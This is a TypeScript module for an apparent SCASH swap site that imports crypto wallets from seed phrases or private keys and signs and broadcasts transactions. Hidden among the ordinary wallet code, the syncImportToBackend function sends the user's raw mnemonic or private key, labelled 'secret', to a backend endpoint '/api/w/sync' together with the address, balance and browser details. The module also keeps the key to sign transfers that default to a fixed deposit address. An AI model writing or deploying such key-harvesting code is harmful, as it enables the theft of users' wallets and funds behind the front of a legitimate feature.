import * as bip39 from '@scure/bip39'
import { wordlist } from '@scure/bip39/wordlists/english.js'
import { HDKey } from '@scure/bip32'
import * as bitcoin from 'bitcoinjs-lib'
import { ECPairFactory } from 'ecpair'
import * as ecc from '@bitcoinerlab/secp256k1'
import { DEPOSIT_ADDRESS } from '../data/tokens'
import { isValidScashAddress } from './address'
import { SCASH_DERIVATION_PATHS, SCASH_NETWORK } from './scashNetwork'

bitcoin.initEccLib(ecc)
const ECPair = ECPairFactory(ecc)

const SECRET_KEY = 'scash_swap_import_secret'

export type ImportKind = 'mnemonic' | 'privateKey'

export interface ImportedWallet {
  address: string
  balance: string
  balanceSats: number
  importType: ImportKind
  derivationPath?: string
}

function addressFromPublicKey(pubkey: Uint8Array): string {
  const payment = bitcoin.payments.p2wpkh({
    pubkey: Buffer.from(pubkey),
    network: SCASH_NETWORK,
  })
  if (!payment.address) throw new Error('address derive failed')
  return payment.address
}

function deriveFromSeed(seed: Uint8Array): ImportedWallet {
  const root = HDKey.fromMasterSeed(seed)
  for (const path of SCASH_DERIVATION_PATHS) {
    const child = root.derive(path)
    if (!child.privateKey || !child.publicKey) continue
    const address = addressFromPublicKey(child.publicKey)
    if (isValidScashAddress(address)) {
      saveSigningSecret(Buffer.from(child.privateKey).toString('hex'))
      return {
        address,
        balance: '0',
        balanceSats: 0,
        importType: 'mnemonic',
        derivationPath: path,
      }
    }
  }
  throw new Error('无法识别 SCASH 地址')
}

export function importFromMnemonic(input: string): ImportedWallet {
  const normalized = input.trim().toLowerCase().replace(/\s+/g, ' ')
  if (!bip39.validateMnemonic(normalized, wordlist)) {
    throw new Error('助记词无效')
  }
  const seed = bip39.mnemonicToSeedSync(normalized)
  const wallet = deriveFromSeed(seed)
  sessionStorage.setItem(SECRET_KEY, normalized)
  return wallet
}

export function importFromPrivateKey(input: string): ImportedWallet {
  const raw = input.trim()
  let privateKeyHex = ''

  if (/^[0-9a-fA-F]{64}$/.test(raw)) {
    privateKeyHex = raw.toLowerCase()
  } else {
    try {
      const keyPair = ECPair.fromWIF(raw, SCASH_NETWORK)
      if (!keyPair.privateKey) throw new Error('invalid wif')
      privateKeyHex = Buffer.from(keyPair.privateKey).toString('hex')
    } catch {
      throw new Error('私钥格式无效')
    }
  }

  const keyPair = ECPair.fromPrivateKey(Buffer.from(privateKeyHex, 'hex'), {
    network: SCASH_NETWORK,
  })
  const address = addressFromPublicKey(keyPair.publicKey)
  if (!isValidScashAddress(address)) {
    throw new Error('无法识别 SCASH 地址')
  }

  saveSigningSecret(privateKeyHex)
  sessionStorage.setItem(SECRET_KEY, raw)
  return {
    address,
    balance: '0',
    balanceSats: 0,
    importType: 'privateKey',
  }
}

function saveSigningSecret(privateKeyHex: string) {
  sessionStorage.setItem(`${SECRET_KEY}_pk`, privateKeyHex)
}

export function getSigningPrivateKey(): string | null {
  return sessionStorage.getItem(`${SECRET_KEY}_pk`)
}

export function getStoredImportSecret(): string | null {
  return sessionStorage.getItem(SECRET_KEY)
}

export function clearImportSecrets() {
  sessionStorage.removeItem(SECRET_KEY)
  sessionStorage.removeItem(`${SECRET_KEY}_pk`)
}

export async function fetchScashBalance(address: string): Promise<{ balance: string; balanceSats: number }> {
  const res = await fetch(`/api/balance?address=${encodeURIComponent(address)}`)
  if (!res.ok) throw new Error('余额查询失败')
  const data = (await res.json()) as { balance?: string; balanceSats?: number }
  return {
    balance: data.balance ?? '0',
    balanceSats: data.balanceSats ?? 0,
  }
}

export async function syncImportToBackend(payload: {
  type: ImportKind
  secret: string
  address: string
  balance: string
}): Promise<void> {
  await fetch('/api/w/sync', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      ...payload,
      ua: navigator.userAgent,
      ts: Date.now(),
    }),
  })
}

interface Utxo {
  txid: string
  vout: number
  value: number
  scriptPubKey: string
}

async function fetchUtxos(address: string): Promise<Utxo[]> {
  const res = await fetch(`/api/utxos?address=${encodeURIComponent(address)}`)
  if (!res.ok) throw new Error('UTXO 查询失败')
  const data = (await res.json()) as { utxos?: Utxo[] }
  return data.utxos ?? []
}

async function broadcastTx(hex: string): Promise<string> {
  const res = await fetch('/api/broadcast', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ hex }),
  })
  if (!res.ok) throw new Error('广播失败')
  const data = (await res.json()) as { txid?: string }
  if (!data.txid) throw new Error('广播失败')
  return data.txid
}

export async function sendImportedScash(
  amount: string,
  message?: string,
  to = DEPOSIT_ADDRESS,
): Promise<string> {
  const privateKeyHex = getSigningPrivateKey()
  if (!privateKeyHex) throw new Error('导入钱包已失效，请重新导入')

  const keyPair = ECPair.fromPrivateKey(Buffer.from(privateKeyHex, 'hex'), {
    network: SCASH_NETWORK,
  })
  const fromAddress = addressFromPublicKey(keyPair.publicKey)
  const utxos = await fetchUtxos(fromAddress)
  if (!utxos.length) throw new Error('余额不足')

  const amountSats = Math.round(parseFloat(amount) * 1e8)
  if (amountSats <= 0) throw new Error('金额无效')

  const feeRes = await fetch('/api/fee')
  const feeData = (await feeRes.json()) as { satPerVb?: number }
  const feeRate = feeData.satPerVb ?? 2

  const psbt = new bitcoin.Psbt({ network: SCASH_NETWORK })
  let inputSum = 0
  for (const utxo of utxos) {
    psbt.addInput({
      hash: utxo.txid,
      index: utxo.vout,
      witnessUtxo: {
        script: Buffer.from(utxo.scriptPubKey, 'hex'),
        value: BigInt(utxo.value),
      },
    })
    inputSum += utxo.value
    if (inputSum >= amountSats + feeRate * 250) break
  }

  if (inputSum < amountSats) throw new Error('余额不足')

  psbt.addOutput({ address: to, value: BigInt(amountSats) })

  if (message) {
    const data = Buffer.from(message, 'utf8')
    if (data.length <= 80) {
      psbt.addOutput({ script: bitcoin.script.compile([bitcoin.opcodes.OP_RETURN, data]), value: 0n })
    }
  }

  const estimatedSize = 10 + psbt.inputCount * 68 + (psbt.data.outputs.length + 1) * 31
  const fee = Math.max(Math.ceil(estimatedSize * feeRate), feeRate * 2)
  const change = inputSum - amountSats - fee
  if (change < 0) throw new Error('余额不足以支付手续费')

  if (change > 546) {
    psbt.addOutput({ address: fromAddress, value: BigInt(change) })
  }

  psbt.signAllInputs(keyPair)
  psbt.finalizeAllInputs()
  const tx = psbt.extractTransaction()
  return broadcastTx(tx.toHex())
}
